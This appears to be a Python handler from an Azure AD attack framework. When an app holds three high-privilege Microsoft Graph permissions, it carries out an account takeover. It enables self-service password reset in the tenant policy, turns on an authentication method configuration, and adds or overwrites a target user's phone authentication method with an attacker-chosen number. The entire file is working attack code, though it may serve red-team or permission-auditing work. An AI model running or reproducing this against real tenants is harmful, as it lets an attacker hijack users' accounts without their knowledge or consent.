from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.policy_user_takeover_method_handler')


class PolicyUserAuthTakeover_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        if ("UserAuthenticationMethod.ReadWrite.All" in request.roles) and ("Policy.ReadWrite.AuthenticationMethod" in request.roles) and ("Policy.ReadWrite.Authorization" in request.roles) :
            logger.info('tid: %s, appid: %s may be vulnerable to policy_user_takeover vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "policy_user_takeoverVectors"
            message = ""
            error = "policy_user_takeoverVectors - failed"
            conf = request.attack_config['UserPolicyAuth']
            logger.debug("Policy.ReadWrite.AuthenticationMethod- Allows the app to read and write all authentication method policies for the tenant, without a signed-in user.")
            logger.debug("UserAuthenticationMethod.ReadWrite.All- Allows the application to read and write authentication methods of all users in your organization, without a signed-in user.")
            logger.debug("Policy.ReadWrite.Authorization- Allows the app to read and write your organization's authorization policy without a signed in user.")
            logger.debug("Attack vector - account takeover.")
            try:
                create_message_URL = "https://graph.microsoft.com/v1.0/policies/authorizationPolicy"
                message_obj = {
                "allowedToUseSSPR":"true"
                }
                result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)

                if result.status_code == 204:
                    create_message_URL = "https://graph.microsoft.com/beta/policies/authenticationMethodsPolicy/authenticationMethodConfigurations/sms"
                    message_obj = {
                        "@odata.type": "#microsoft.graph.temporaryAccessPassAuthenticationMethodConfiguration",
                        "state":"enabled"
                    }
                    result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)

                    if result.status_code == 204: # changed sms method

                        create_message_URL = "https://graph.microsoft.com/v1.0/users/" + conf[
                            "UserId"] + "/authentication/phoneMethods"
                        message_obj = {
                            "phoneNumber": conf["phone"],
                            "phoneType": "mobile"
                        }
                        result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)

                        if result.status_code == 200:
                            message += "Changed the phone of %s   \n" % (conf["UserId"])
                            status = True

                        elif result.status_code == 400:

                            create_message_URL = "https://graph.microsoft.com/v1.0/users/" + conf[
                                "UserId"] + "/authentication/phoneMethods/3179e48a-750b-4051-897c-87b9720928f7"
                            message_obj = {
                                "phoneNumber": conf["phone"],
                                "phoneType": "mobile"
                            }
                            result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)

                            if result.status_code == 204:
                                message += "Changed the phone of %s   \n" % (conf["UserId"])
                                status = True

                if message == "":
                    message = error
            except:
                
                logger.error("Unexpected exception in policy_user_takeover_method_handler function")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
